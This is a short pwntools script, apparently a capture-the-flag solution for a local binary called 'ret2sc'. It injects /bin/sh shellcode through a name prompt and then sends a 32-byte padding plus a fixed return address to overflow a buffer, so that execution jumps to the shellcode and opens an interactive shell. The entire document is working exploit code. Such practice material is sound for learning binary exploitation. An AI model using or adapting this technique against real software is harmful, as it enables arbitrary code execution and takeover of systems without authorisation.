from pwn import *

context.arch = "i386"
context.log_level = "DEBUG"

p = process("./ret2sc")

shellcode = asm(shellcraft.sh())
# "A"*24 ~ "A"*39
payload = "A"*32 + p32(0x804A060)

p.sendlineafter("Name:", shellcode)
p.sendlineafter("best:", payload)

p.interactive()